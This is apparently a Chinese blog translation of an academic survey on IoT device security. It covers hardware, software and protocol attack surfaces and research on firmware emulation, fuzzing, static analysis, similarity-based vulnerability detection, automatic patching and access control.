<h3 id="3-3-a-name-1-a-攻击面">3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>攻击面</h3>
<p>针对IoT设备的攻击面不仅包括传统软件安全领域，因为它们的特殊结构和功能，也包括了新的攻击领域。根据IoT架构和设备构成，攻击面可以分为三个层面（图3）</p>
<ul>
<li>图3<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613163604.png" alt="20210613163604"></li>
</ul>
<h4 id="3-3-1-a-name-1-a-硬件层">3.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>硬件层</h4>
<p>硬件层面的攻击不同于传统的安全领域，它主要包括三个角度：不安全的调试接口、未保护的闪存芯片、硬件敏感信息的泄露</p>
<ol>
<li>不安全的调试接口当IoT设备被制造的时候，调试接口比如UART会被留在电路板上以便维修。如果它缺少身份验证或者仅有弱身份验证，攻击者就可以通过接口来获得高权限，对固件进行修改或者替换。调试接口在IoT安全检查中排在第一位</li>
<li>未保护的闪存芯片因为闪存通常用来存储固件，因此也成为了关注的重点。如果芯片没有读写保护，安全研究者就可以通过读取固件来分析或者修改固件，来绕过接口的身份验证</li>
<li>硬件敏感信息的泄露<br>
硬件电路的密封性并不好，诸如声音和电量消耗的硬件信息泄露可以造成侧信道攻击[^28-^31]，攻击者可以由此获得重要的信息，比如密钥。</li>
</ol>
<h4 id="3-3-2-a-name-1-a-软件层">3.3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>软件层</h4>
<p>软件层面的攻击对应着设备构成中bootloader和固件的软件部分，它主要包括以下五个方面：不安全的bootloader、不安全的操作系统、固件敏感信息泄露、不安全的应用服务、不正确的配置策略</p>
<ol>
<li>不安全的bootloader因为bootloader是一段在设备运行后加载的代码，因此是一个容易被忽略的攻击点。它的功能是初始化并加载固件，因此当问题出现时它的危险程度很高。例如checkm8这个Boot ROM 漏洞被称为是iphone、ipad、apple TV和 apple watch上的史诗级漏洞</li>
<li>不安全的操作系统由于研发周期短和轻量化的需求，IoT设备的操作系统内核是定制的，版本也不经常更新，这导致了大量的缓冲区溢出问题，如提权等。除此之外，设备使用了各种各样的传感器和通信模块，包括内核中大量的驱动。例如，Marvell WiFi芯片驱动找到了多个漏洞，包括 CVE-2019-14901, CVE-2019-14897 和CVE-2019-14896，它们导致了内核中基于栈或堆的缓冲区溢出。这也是攻击面中重要的一部分</li>
<li>固件敏感信息泄露IoT设备的本地存储通常使用轻量化的存储方案，开发者通常忽略了它的安全性，并使用了明文或只是进行了简单的加密，这很容易导致敏感数据的泄露</li>
<li>不安全的应用服务应用服务开发缺少安全标准。为了加快产品的开发，通常直接编译、使用了简单、不安全的应用代码，因此引入未知的漏洞。IoT安全研究者们已经发现了大量开发时产生的应用漏洞，包括出于未知原因留下的后门</li>
<li>不正确的配置策略<br>
为了方便管理IoT设备，ssh、telnet等服务是默认的开启，这样会造成配置问题。默认配置下的弱验证策略使攻击者容易获得设备的权限。例如，Telestar Digital GmbH 的物联网收音机可通过未经验证的telnet服务器被远程攻击者劫持利用[^34]，这些漏洞已经被CVE-2019-13473[^35]和CVE-2019-13474[^36]收录。</li>
</ol>
<h4 id="3-3-3-a-name-1-a-协议接口层">3.3.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>协议接口层</h4>
<p>协议接口层的攻击包括了通信和API，它涉及到用户侧直接控制和由云端间接控制的设备，以及以上两种通信过程中的信息保护问题，并不涉及到协议的安全。例如，IoT通信协议的滥用和AR-Ddos[^37]攻击正是通过IoT通信协议CoAP[^38]、SSDP[^39]和SNMP执行的，它的目标不是IoT设备，但是它也是IoT安全一个重要的研究方向。协议接口层的攻击主要包括一下三个角度：不安全的远程管理接口、数据传输过程中的信息泄露、弱身份验证</p>
<ol>
<li>不安全的远程管理接口为了方便管理，IoT设备使用http服务之类的远程管理方式，这带来了诸多漏洞，例如sql注入、XSS和远程执行漏洞等</li>
<li>数据传输过程中的信息泄露IoT通信协议使用了弱加密算法或者根本不进行加密，导致敏感信息泄露。例如论文<em>Passwords in the Air</em>[^40]中提到的，当IoT设备接入网络时，WiFi密码以明文传输</li>
<li>弱身份验证<br>
由于安全需要，管理IoT设备需要身份验证绑定，于是产生了一个新的攻击面。攻击者可以绕过身份验证，重复绑定然后获得用户的信息，论文<em>Phantom Device Attack</em>[^41]在这个攻击面上找到了四种攻击方法</li>
</ol>
<h2 id="4-a-name-1-a-漏洞分析、挖掘、检测和缓解">4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析、挖掘、检测和缓解</h2>
<p>现阶段，对IoT安全没有精确的分类，此外，安全研究的核心在于漏洞，因此我们把重点放在设备的漏洞。在研究周期中，研究分为三个阶段：挖掘、检测和缓解。因为IoT安全的特殊性导致不可能有用于分析的标准接口，因此，针对物联网的基础分析框架的研究内容也很有价值。为了审视现有的物联网安全技术，我们从以下四个角度进行总结：（1）漏洞分析的基础框架的研究，使用了固件模拟来帮助分析IoT安全问题；（2）漏洞挖掘技术研究，主要针对挖掘IoT设备中的未知漏洞的手段；（3）漏洞检测，研究基于现有漏洞的特征来检测已知漏洞；（4）漏洞缓解技术的研究，研究了自动修复漏洞或者加入访问控制来限制恶意行为。另外，这节总结的IoT漏洞分析技术需要一系列前提条件，例如固件提取[^42]，因此我们标注了技术要求，但并不总结它们。</p>
<h3 id="4-1-a-name-1-a-漏洞分析的基础框架研究">4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞分析的基础框架研究</h3>
<p>为了解决人们对物联网安全的担忧，即使没有源代码或者硬件资料，对固件二进制文件的准确分析也极为重要[^43]。然而，由于缺少专门的基础框架，IoT安全领域的漏洞分析收到了阻碍。例如，动态分析依赖于在可控的环境（通常是设备化的模拟器[^43]）中执行程序，因此基础框架主要提供了通过半仿真和全仿真的功能。它可以进行复杂的动态分析以支持IoT安全研究。**技术要求：**能够获得IoT设备固件对于缺少专门用于分析固件，特别是用于动态分析的工具，Avatar[^43]提出了一个结合了在模拟器上的模拟执行模式和在真实设备上的实际执行模式的框架来分析固件。当固件在模拟模式下运行时，当发生I/O时，Avatar将操作转发到设备，设备执行操作后将结果传给模拟器，以便模拟器继续运行。它有效地应对了特定外围设备缺少源码和文档的问题。随后，Prospect[^44]和Surrogate[^45]也提出了类似的动态分析框架。四年后，Avatar开发团队开发出了Avatar2[^46]，允许安全研究者在不同动态分析框架、调试器、模拟器和实际设备之间交互操作，除此之外，作者还展示了如何使用Avatar2来记录设备的执行流。Chen等人[^47]提出了用于linux设备的Firmadyne，首先使用软件进行系统仿真，然后采用扫描和探测等动态分析方法来挖掘漏洞。以上框架的模拟功能都基于QEMU[^48]。对于不易模拟的传感器操作，半模拟框架[^43-^46]在执行表1的固件指令时，通过软件代理的方式引导对物理硬件的I/O操作</p>
<ul>
<li><strong>表1</strong>是漏洞分析基础框架的总结。<br>
Semi-simulation指的是框架需要真实的设备来进行I/O访问<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613214401.png" alt="20210613214401"></li>
</ul>
<h3 id="4-2-a-name-1-a-漏洞挖掘技术研究">4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞挖掘技术研究</h3>
<p>随着IoT设备漏洞的增加和攻击趋势的上升，安全研究者在设备的漏洞挖掘上花费越来越多时间。这一届表述了漏洞挖掘的技术，包括动态和静态分析。通过学习传统的软件安全分析技术，我们发现动态分析主要包括fuzz[^49]和污点检测[^50]，静态分析主要包括符号执行[^51]、污点分析、数据流分析[^50]。</p>
<h4 id="4-2-1-a-name-1-a-动态分析方法">4.2.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>动态分析方法</h4>
<p>动态分析方法需要仿真固件工具来进行动态调试，或者在物理设备上进行片上调试，来获得反馈信息。主要通过fuzz来得到漏洞的触发点<br>
**技术要求：**在IoT设备上进行动态调试的能力<br>
在卡片安全研究领域，Alimi等人[^52]使用了一个通用的算法生成测试样本，对手机卡和银行卡进行fuzz。对于现在一些内置web服务器的智能卡片，Kamel等人[^53]发现了一些基于HTTP协议生成方式的bug，并据此对web服务器进行了fuzz。在汽车安全领域，Koscher[^54]和Lee[^55]通过修改发送给CAN的数据包来改变汽车的状态[^56]，来对汽车的智能系统进行fuzz。<br>
因为IoT固件提取的困难，IoTFuzzer[^57]通过从用户侧捕获崩溃信息来避免了这个问题。首先，它在手机应用中的交互协议代码里插桩，然后修改从桩获取的数据，最后根据心跳包（Heartbeat packet）和响应来判断fuzz的效率。因为设备很难直接调试，研究者开始结合仿真技术来发现漏洞。Costin等人[^58]实现了应用动态固件分析技术来进行嵌入式固件镜像中web接口的漏洞自动化挖掘框架。最近，Srivastava等人的目标不再仅限于web接口，他们展示了FirmFuzz[^59]，一个独立于设备的、针对Linux固件镜像的自动化仿真和动态分析框架。Zheng等人[^60]提出了Firm-AFL，它是第一个针对IoT固件的高吞吐量灰盒fuzzer，他们扩展了AFL[^61]，把它变成了现在IoT领域最流行的fuzzer。对于fuzz的研究，Muench等人分析了传统的IoT设备异常状态检测方法的通用性，然后实现了一个基于Avatar[^43]和[^63]的系统，另外，他们比较了黑盒fuzzer在不同配置下的吞吐量，包括本机执行（直接向硬件输入）、部分仿真（仅将硬件请求重定向到硬件）、全仿真[^60]，这是一项对漏洞分析技术性能的评估。上述提到的动态分析技术发现的漏洞类型详见表2，主要是内存问题例如缓冲区溢出和空指针解引用，由于对web接口进行了研究，也有一些web服务器漏洞例如XSS、SQL注入。</p>
<h4 id="4-2-2-a-name-1-a-静态分析方法">4.2.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>静态分析方法</h4>
<p>静态分析不需要运行固件就可以挖掘漏洞。寻找bug的过程可以理解程序代码，因此它具有可扩展性。**技术要求：**能够获得IoT设备的固件静态分析步骤如下：（1）提取固件，（2）逆向固件中的程序，（3）通过人工审计找到安全问题。在学术界，研究人员主要探索通过自动化静态分析方法来找到漏洞。在表2，我们总结了静态分析的研究目标、细分的技术和发现的漏洞种类。Costin等人[^64]首先自动化分析了大量嵌入式设备的固件。他们自动解压运行了固件，然后使用模糊哈希来匹配固件中的弱密钥。FIE[^65]基于KLEE[^66]构建了嵌入式设备的符号执行引擎。它制定了内存规范、中断规范、芯片规范，以发现固件中违反自定义安全规范的问题。Firmalice[^67]也是一个基于符号执行的框架，它通过后门的输入确定性来找到身份验证绕过漏洞。SainT[^68]和DTaint[^69]提出了静态污点分析方法，分别在设备软件或二进制代码上挖掘漏洞。</p>
<ul>
<li><strong>表2</strong>：<br>
BO=缓冲区溢出漏洞；NPD=空指针解引用；CL=命令注入；CSRF=跨站请求伪造<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210614224801.png" alt="20210614224801"></li>
</ul>
<h3 id="4-3-a-name-1-a-漏洞检测研究">4.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞检测研究</h3>
<p>前面提到的动态和静态分析技术也可以应用于检测已知的漏洞。在大规模的检测场景，动态分析依赖于使用架构专用的工具来执行程序，静态分析检测已知漏洞的方式和发现0day漏洞的方式相同，但提高了性能和耗时。目前，研究者主要使用以下两种方法：网络扫描和代码相似性检测。</p>
<h4 id="4-3-1-a-name-1-a-网络扫描">4.3.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>网络扫描</h4>
<p>网络扫描通过向在线的IoT设备服务发送带有payload的探测包来检测已知漏洞。网络扫描在安全领域更为通用，随着IoT安全的发展，产生了网络扫描物联网设备的议题。<br>
**技术要求：**了解漏洞的有关信息，如POC<br>
Cui等人[^70]扫描了网络上存在的嵌入式设备，发现了一系列设备含有弱密码和其他漏洞。在2013年后，搜索引擎例如Shodan[^71]和Censys[^72]以及Zoomeye[^73]产生了，它们能够识别和检测弱密码、后门、和已知的漏洞。然而，仅靠外部扫描只能发现一小部分漏洞，而且，未授权扫描联网设备也存在道德问题。因此，网络扫描漏洞常常在内网和实验室中进行。网络扫描的优点在于从服务层进行检测并不需要考虑设备的结构，并且它高效快速，适合大规模测试。现有的商用漏洞检测系统大多基于这种方法。</p>
<h3 id="4-4-a-name-1-a-相似性检测">4.4. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>相似性检测</h3>
<p>由于IoT设备中存在大量没有修复过的已知漏洞，安全研究员们提出软件代码相似性检测方法来检测已知漏洞。在现阶段，相似性检测的研究主要针对传统软件安全领域，然后通过跨架构逐步支持物联网设备，而不存在专门研究IoT固件相似性检测的论文。如图4，相似性检测的基本思路是从代码中提取原有特征，如字符串、指令序列、基本块、语法树和函数调用图等，接着，通过算法测量特征的相似度，最终确定相应的代码片段中是否存在漏洞。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210615165124.png" alt="图4.相似性检测结构"></p>
<p>**技术要求：**获得IoT设备固件</p>
<h4 id="4-4-1-a-name-1-a-源代码相似性检测">4.4.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>源代码相似性检测</h4>
<p>对于在源代码上检测已知漏洞， CP-Miner[^74]提出了基于token的方法，使了用词法分析器来产生token序列，然后搜索重复的token序列来衡量相似性。ReDeBug[^75]提出了一个可扩展的方法，它结合代码补丁来确定修复前的漏洞代码的特征，并且可以识别未打补丁的代码。然而，以上基于源代码的方法并没有应用在IoT上，在绝大多数情况下，安全研究员们无法获得固件的源代码。</p>
<h4 id="4-4-2-a-name-1-a-二进制代码相似性检测">4.4.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>二进制代码相似性检测</h4>
<p>对于在二进制代码上检测已知漏洞，研究者主要面临的问题是，不同的编译器代码生成算法、编译优化选项以及不同指令集导致难以检测相似性。N-Grams[^67]和N-Perms[^77]是早期的漏洞搜索方法[^78]。Karim等人使用内存中的二进制片段或代码来匹配算法，由于没有对代码语义进行了解，这种方法难以应对不同编译级别带来的指令重排序问题。为了提升匹配的准确性，Tracelet-based[^80]提出将代码重构为可执行序列，然后使用求解器来处理程序约束和数据约束，因此它解决了指令重排序的问题。此外，TEDEM[^81]采用符号简化二进制程序，并通过树编辑距离作为基本块来判断代码相似性，它甚至可以找到不同操作系统的漏洞。<br>
由于一些相同的语义特征，导致难以表示两个二进制程序基本块特征相似性。研究者开始考虑使用CFG[^82]来描述程序的行为，因此可以通过图来进行相似性比较。BinDiff[^83]和Binslayer[^84]能够通过检测CFG相似度，来检查两个二进制程序的相似性，不过它们并不是专门为漏洞检测设计的。通过比较两个完全不同的二进制文件的CFG，还是难以发现跨平台的漏洞片段。Egele等人[^85]提出了Blanket Execution 并指出，基于静态分析的二进制语义相似性研究容易受编译链和编译优化级别的影响。因此他们建议提取程序动态运行时的特征，来应对造成CFG改变的影响。BinHunt[^86]和iBinHunt[^87]使用了符号执行和理论证明，来检查基本块之间的语义等价性，并找出哪些语义有所不同。<br>
然而不同IoT设备的固件差异很大，包括多种架构如MIPS、ARM、PPC、x86等，它们的操作码、寄存器名称和内存寻址方式都有差别，因此，以上提到的方法难以应用于大规模的跨架构代码漏洞检测。直到最近两三年，研究人员开始研究二进制代码基础上的跨架构代码相似性检测[^88-^90]。Multi-MH[^88]是第一个基于二进制代码的跨架构代码相似性检测方法。首先，将二进制代码转换为中间代码，然后使用特定的输入来测试程序，并根据I/O的行为来捕获基本块的语义，最后根据捕获的CFG来检测漏洞。然而它在处理大量函数时的性能开销过大。DiscovRE[^89]通过图匹配算法检查一组函数对的CFG是否相似，并通过预筛选来加快CFG匹配过程。然而它的预筛选过程并不可靠且会漏报过多漏洞。BinGo[^90]通过引入选择性内联相关库函数以及用户定义的用于跨平台代码搜索的函数来捕捉完整功能语义。然而它并不是特别为IoT设备设计的。Genius[^91]使用机器学习的传统方式，从CFG学习高层特征表征。另外，它将图嵌入[^92]编码为一个高位数字特征向量，然后使用图匹配算法测量目标函数和一组二进制函数的相似性，这可以有效的提升性能和可扩展性。Xu等人[^93]首先提出了基于深度学习的跨架构二进制代码相似性检测方法，使用了神经网络模型的图嵌入技术。在跨版本代码相似性检测，αDiff[^94]迈出了重要的一步。它基于DNN模型，提取了三个语义特征，包括函数、功能间和模块间的特征，来进行检测。Gao等人提出了VulSeeker[^95]和VulSeeker-Pro[^96]。这些漏洞搜索方法都通过与深度学习结合，来提高检测的准确性，后面提到的两种方法被证实比目前其他的（例如Gemini[^93]）方法准确度都高。</p>
<h3 id="4-5-a-name-1-a-漏洞缓解研究">4.5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>漏洞缓解研究</h3>
<p>在漏洞挖掘和检测的基础上，漏洞缓解措施也是行业关注的一个研究问题。根据公开的文献研究，主要研究热点是自动化生成补丁和访问控制。前者旨在修复漏洞，后者研究如何限制恶意行为。</p>
<h4 id="4-5-1-a-name-1-a-自动化生成补丁">4.5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>自动化生成补丁</h4>
<p>这节所说的自动化生成补丁技术并不专指IoT领域，而是一个传统安全领域的扩展。漏洞修复通常由开发团队在源代码上完成。在获得外部漏洞报告后，他们通过漏洞触发条件和分析漏洞机制来评估漏洞。自动生成补丁可以自动修复软件错误，而不需要开发者人工判断、理解、修正。[^97]<br>
**技术要求：**获得和升级IoT设备固件<br>
软件工程领域的研究者们提出，通过学习正确的c语言[^97,^98]、Java[^99]和其它源代码级别中的正确代码可以自动生成补丁，这一想法取得了初步可行成果。另一种想法是改变程序的形式而不改变它的功能。GenProg[^100]使用了遗传编程的扩展形式来演化程序变体，该变体保留了所需功能但不易受到给定缺陷的影响，然而由于突变操作的随机性，它会生成无意义的补丁。因此Kim等人[^101]提出了基于模式的自动化程序修复（PAR）来解决上述的问题。在安卓平台上，Zhang等人[^102]提出了AdaptKpatch，一个自适应内核修补程序框架和LuaKpatch，它将一个类型安全的动态语言引擎插入内核来执行补丁。这两个方案解决了安卓平台的补丁链过长、碎片化和平台生态布局不匹配、细分修复不及时的问题。然而它们没有考虑解决在跨CPU架构自动进行热修复的问题，他们依旧需要基于知识和经验进行手工编写。DARPA的CGC[^103]引领了在二进制代码级别上的自动化防御方法，然而主要采用的依旧是通用的防御方法，例如二进制代码加固、边界检查和指针修复[^106]</p>
<h4 id="4-5-2-a-name-1-a-访问控制">4.5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>访问控制</h4>
<p>访问控制方法是通过管理IoT设备的用户侧或平台许可，来阻止或结束攻击者的恶意行为。<br>
**技术要求：**用户侧或云端的可扩展性<br>
Fernandes等人[^107]首先深入研究了IoT平台的安全例如SmartThings，他们发现，由于功能粗粒度，大量的应用获得了多余的权限，<br>
智能家居中的许多设备获得了过多的权限，模糊的权限管理，导致了许多针对IoT设备的攻击以及隐私泄露。密歇根大学的研究者们想出了一系列办法来解决这些问题。2016年，他们提出了Flowfence[^108]，一个基于数据流来保护隐私泄露的系统，它将程序分为两部分：（1）一系列负责操作沙箱中敏感数据的隔离的模块。（2）不操作敏感数据，但通过污点跟踪不透明的句柄将隔离的模块链接在一起来协调执行的代码，其中涉及到的数据的数据只能在沙箱内被解引用。于是在2017年，他们又提出了基于上下分信息的ContextIoT[^109]，它可以帮助用户提升访问控制的有效性，通过识别敏感操作上下文标识和保证运行时的上下文完整性，来抵御攻击者进行危险操作。2018年，一个针对智能家居的基于风险控制的模型Tyche[^110]被提出，它建立了访问控制列表（ACCLs），在源代码层面解决访问权限过多的问题。Smartauth[^111]和FACT[^112]同样基于ACCLs，然而他们采取了不同的方法来建立ACCLs。Smartauth通过NLP识别的文件和APP源代码建立ACCLs，FACT在设备开发的阶段就建立了ACCLs。</p>
<!--↑-->
<h2 id="5-a-name-1-a-讨论">5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>讨论</h2>
<p>在前面几节，我们深入探索了目前关于IoT漏洞分析技术的研究。在这一节，我们首先评估了漏洞分析技术，其次，通过评估指出现阶段研究的难点，最后提出了应对这些难点的技术机会。</p>
<h3 id="5-1-a-name-1-a-评估">5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>评估</h3>
<p>在表3，我们从5个角度进行评估，包括攻击面、技术要求、支持的架构、支持的操作系统和是否与AI结合。在漏洞分析过程中，研究者需要仿真、调试接口、网络流量等方面的技术支持。例如，IoTFuzzer[^57]使用了把目标转移到APP的外围系统分析方法。这种方法优点是能更好的避免架构的复杂性，	缺点是粗粒度的崩溃信息阻碍了对漏洞的进一步分析。从这些角度的的评估能够更容易的对技术难题和未来的发展趋势进行分析。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193125.png" alt="20210616193125"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193206.png" alt="20210616193206"></p>
<h3 id="5-2-a-name-1-a-难点">5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>难点</h3>
<p>前面的评估反映出当今IoT设备上的漏洞分析存在的难题。如表4中展示出的，不同技术领域对研究的影响不同，至于IoT设备漏洞分析需要的技术，现存的难题如下：</p>
<ul>
<li>**表4：**这张表总结了难点和机会的影响范围，影响的范围包括四种：IoT分析的基础框架（T1）、漏洞挖掘技术（T2）、漏洞检测技术（T3）、漏洞缓解技术（T4）。√=难点或机会和这个领域的技术有关<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616202548.png" alt="20210616202548"></li>
</ul>
<h4 id="5-2-1-a-name-1ComplexityandHeterogeneityofDevice-a-（1）设备的复杂性和异构性">5.2.1. <code>&lt;a name='1ComplexityandHeterogeneityofDevice'&gt;&lt;/a&gt;</code>（1）设备的复杂性和异构性</h4>
<p>这个问题一直都是IoT设备漏洞分析技术的最大难点，IoT设备的差异性比PC和手机都大。它使用了多种CPU架构如ARM、MIPS、x86，以及不同的操作系统如Linux、Windows和安卓，它通常使用定制化的固件和内存使用，这使得难以直接在IoT领域应用行业上的自动化检测、挖掘漏洞技术。IoT设备的复杂性使得静态和动态调试更加难以进行。我们发现现阶段主要选择路由器等基于arm的Linux设备来作为研究对象。相似性检测方面的研究扩展到了跨架构的场景[^88-^91,^93-^96]。其他研究并没有遇到这个问题。</p>
<h4 id="5-2-2-a-name-2Limitationsofdeviceresources-a-（2）设备资源的限制">5.2.2. <code>&lt;a name='2Limitationsofdeviceresources'&gt;&lt;/a&gt;</code>（2）设备资源的限制</h4>
<p>由于产品轻量化的需求，IoT设备大多运行在精简的操作系统，或者甚至只在微控制器上运行一个程序。上述原因造成了设备资源有限的特点。对于IoT设备安全测试来说，通过向目标部署相关分析模块，来实现对运行程序外围的监控分析并不容易。安全研究者并不能使用传统的安全分析手段和工具，他们需要重构分析平台。另外，由于设备硬件的计算能力有限，动态分析的性能下降了。最近几年，研究者开发了一套仿真系统，在基础架构[^43-^47]和漏洞挖掘[^56,^60,^64]领域应对了这个问题。然而这个问题还没有完全解决，且会是一个长期的难题。</p>
<h4 id="5-2-3-a-name-3Closed-SourceMeasures-a-（3）闭源措施">5.2.3. <code>&lt;a name='3Closed-SourceMeasures'&gt;&lt;/a&gt;</code>（3）闭源措施</h4>
<p>对于常规的软件，我们可以在源代码或二进制程序层面挖掘或检测漏洞，对于IoT设备制造商，由于他们的闭源措施，这些方法并不能使用。代码审计，例如[^3.3.2]节的&quot;源代码层面的相似性分析&quot;不再适用于IoT漏洞分析。他们甚至对固件进行加密、加强对串行调试接口的身份验证，并且认为这样会更加安全。例如Dlink-882(867,878)、360 clear robots最新的固件都被加密了。因此，基于源代码、固件和调试接口的漏洞分析变得越来越困难。通过之前的评估，我们发现近两年的漏洞挖掘和检测技术已经绕开了调试接口[^59,^60]和固件，然而又出现了信息不完整等问题。</p>
<h3 id="5-3-a-name-1-a-机会">5.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>机会</h3>
<p>IoT的特点不仅给漏洞分析带来了难题，同时也带来了新的机会。</p>
<h4 id="5-3-1-a-name-1AI-a-（1）AI技术的应用">5.3.1. <code>&lt;a name='1AI'&gt;&lt;/a&gt;</code>（1）AI技术的应用</h4>
<p>在最近几年，AI和IoT两种新技术已经出现了结合，促进社会进入了AIoT的时代。AI技术的发展也给IoT安全带来了新的措施和解决方案。如今，出现了运用AI进行访问控制[^111]和相似性检测[^89-^91,^93-^96]的研究，随着IoT和AI的发展，新的漏洞挖掘、检测和缓解技术不可避免的出现了，当AI应用在IoT设备上时，这同时也是AI对抗攻击和防御的新机会。例如，攻击者污染智能音箱的数据集，诱导它对某些问题回复一些负面信息（辱骂性词语），而安全研究者们通过改进AI算法来避免这类问题。</p>
<h4 id="5-3-2-a-name-2-a-（2）对第三方和开源代码的依赖">5.3.2. <code>&lt;a name='2'&gt;&lt;/a&gt;</code>（2）对第三方和开源代码的依赖</h4>
<p>IoT固件开发依赖了大量第三方和开源代码，制造商通常只把新功能、高性能和低功耗作为产品的主要目标，同时尽可能缩短开发周期以提升市场竞争力。因此，他们采用了敏捷开发。许多IoT设备制造商直接重复使用开源代、参考公共代码实现、交叉编译PC平台的代码、依赖第三方库。Cui等人[^113]发现80.4%的打印机固件在发布时包含大量已知漏洞，许多最新的固件升级包仍然含有第三方库漏洞，有些漏洞在8年前就已经披露。尽管这件事情暴露了大量安全问题，但仍然带来了独特的漏洞挖掘技术，可以通过不同层次信息的相似性来挖掘同源漏洞。相似性检测也将推动IoT领域的应用程序。</p>
<h4 id="5-3-3-a-name-3-a-（3）外围设备系统的开发">5.3.3. <code>&lt;a name='3'&gt;&lt;/a&gt;</code>（3）外围设备系统的开发</h4>
<p>IoT设备的交互性越来越强，它逐渐提升促进IoT外围设备的发展。IoT设备通常使用终端（PC和手机）、云端和其他系统进行交互。这不仅增加了新的攻击面，同时有助于外围设备分析技术的发展，以解决固件提取集和分析的困难。例如，现有的IoTFuzzer[^57]和访问控制框架[^108-^112]都具备对于外围系统的自动分析和保护技术。</p>
<h2 id="6-a-name-1-a-研究方向">6. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>研究方向</h2>
<p>在前面几节中，我们介绍了面临的难题和机会，我们发现IoT漏洞挖掘、检测和环节技术延续了传统安全研究的轨道，但同时也有其不同的研究方向。</p>
<ul>
<li><strong>基于AI的漏洞挖掘和分析技术</strong>不论是在功能还是安全上，IoT和AI技术都在迅速结合。现有的AI技术成功运用在了漏洞检测上。随着研究的继续，AI会扩展到其他的漏洞分析技术上。例如，GANs[^114]已经应用在了IoT系统异常行为检测上[^115]。在未来，GANs或许可以应用在IoT漏洞挖掘领域，因为它可以学习不同的攻击场景，来生成类似0day攻击的样本，并为算法提供一系列现有攻击外的样本。</li>
<li><strong>大规模漏洞检测技术</strong>在4.2节中提到，IoT设备的复杂性和异构性妨碍了大规模、自动化的漏洞分析技术研究。然而，这个技术需求在IoT安全产业已经迫在眉睫。安全研究者需要一个跨平台方案来克服这个问题，这也是一个长期的研究方向。</li>
<li><strong>自动化漏洞利用</strong><br>
为了利用IoT设备中的漏洞并保护设备免受入侵，我们需要自动化生成poc，因为它能帮助更好理解漏洞的危害和成因。随着IoT领域的发展，自动化攻击和防御也将成为热点。</li>
<li><strong>外围设备的漏洞分析</strong><br>
通过之前对现有难题的分析，我们发现难以通过静态和动态分析直接分析设备。IoT设备的交互性变得越来越强，不仅与外围系统结合的漏洞会越来越多，对外围系统的分析方法的研究也会增加。</li>
<li><strong>在二进制代码层面自动生成多平台补丁</strong><br>
由于一些IoT厂商将代码闭以及和不注重安全性，设备固件没有办法及时打上补丁。为此，我们需要跨平台二进制代码漏洞自动化修复方案。自动化生成二进制代码层的补丁需要完全理解Bug的成因和消除方法。如果我们完全依赖该领域专家的知识，将会出现数以千计的安全漏洞模板，因此难以达成可扩展且可行的解决方案。同时，操作系统和硬件架构的多样性也带来了技术上的难题。解决自动生成多平台的二进制代码补丁这一难题，将是全安全领域一个长期的目标。</li>
</ul>
<h2 id="7-a-name-1-a-结论">7. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>结论</h2>
<p>随着IoT的迅速发展，确保用户的安全和隐私保护带来了显著的影响和挑战。虽然关于IoT设备安全的研究数量逐渐上升，但在信息安全的领域仍然处于起始阶段。因此，需要一个对于现有研究的综合摘要来指引IoT安全的发展。这篇论文分析了消费者层和产业层的IoT设备架构和攻击面，展示了当前研究的背景。我们首先从四个方面完善了分类：分析工具、漏洞挖掘、漏洞检测和漏洞缓解。基于这四个方面，我们回顾了漏洞分析的技术。另外，我们总结了目标、特点和研究方向。随后，我们评估了漏洞分析的技术，发现现有研究面临的难点，包括设备的复杂性和异构性、设备资源的限制、长期闭源的措施。困难同样伴随着机会。AI技术和外围设备分析将会广泛应用在IoT安全领域。在未来，将会有越来越多的技术和新领域结合，来实现大规模、跨架构的自动化漏洞分析。</p>
<h2 id="8-参考">8. 参考</h2>
<p>[^1]: Lueth, K.L. State of the IoT 2018: Number of IoT Devices Now at 7B—Market Accelerating. Available online:<span class="exturl" data-url="aHR0cHM6Ly9Jb1QtYW5hbHl0aWNzLmNvbS9zdGF0ZS1vZi10aGUtSW9ULXVwZGF0ZS1xMS1xMi0yMDE4LW51bWJlci1vZi1Jb1QtZGV2aWNlcy1ub3ctN2Iv">https://IoT-analytics.com/state-of-the-IoT-update-q1-q2-2018-number-of-IoT-devices-now-7b/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^2]: Rawlinson, K. Internet of Things Research Study. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3c4LmhwLmNvbS91cy9lbi9ocCVFRiVCRiVCRW5ld3MvcHJlc3MtcmVsZWFzZS5odG1sP2lkPTE3NDQ2NzY=">https://www8.hp.com/us/en/hp￾news/press-release.html?id=1744676<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
